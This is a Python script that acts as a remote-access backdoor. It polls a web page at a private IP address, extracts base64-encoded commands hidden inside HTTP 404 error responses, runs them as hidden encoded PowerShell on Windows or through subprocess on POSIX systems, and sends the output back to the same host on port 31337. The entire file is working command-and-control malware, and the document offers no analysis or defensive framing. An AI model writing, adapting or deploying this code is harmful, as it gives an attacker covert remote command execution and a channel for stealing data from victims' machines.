import urllib.request as foOfo
import urllib.error as oohhh
import base64, time, socket, os
import subprocess
from subprocess import (PIPE, Popen)

check = ''
ip = '172.16.176.156'

class four0four:
	def __init__(self):
		self.url = 'http://172.16.176.156/pop.html'
		self.opsys = os.name
		
	def nt(self,y):
		cmd_result=''
		z=str(base64.b64decode(y))[2:-1]
		attack = "powershell -nop -win hidden -noni -enc " + base64.b64encode(z.encode('utf_16_le')).decode('utf-8')
		print(attack)
		result = (Popen(attack, stdout=PIPE, shell=True).stdout.read())
		try:
			sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
			sock.connect((ip, 31337))
			print('Sending request')
			sock.send(result)
		except:
			pass
		result = str(result)[2:-1]
		cln = result.split('\\r\\n')
		for i in cln:
			cmd_result+=i+'\n'
		return cmd_result
		
	def posix(self,y):
		cmd_result=''
		z=str(base64.b64decode(y))[2:-1]
		print(z)
		x=z.split(' ')
		output = subprocess.check_output(x)
		try:
			sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
			sock.connect((ip, 31337))
			print('Sending request')
			sock.send(output)
		except:
			pass
		result = str(output)[2:-1]
		cln = result.split('\\n')
		for i in cln:
			cmd_result+=i+'\n'
		return cmd_result
		
f0f = four0four()
while True:
	x=''
	try:
		foOfo.urlopen(f0f.url)
	except oohhh.HTTPError as e:
		x=str(e.read())
	if len(x)==0:
		exit()
	try:
		y=((x.split('HTMLDOC'))[1].split('HTMLDOC')[0])
		if check == y:
			pass
		else:
			check = y
			if f0f.opsys == 'nt':
				f0f_result=f0f.nt(y)
			else:
				f0f_result=f0f.posix(y)
	except:
		pass
	time.sleep(5)
	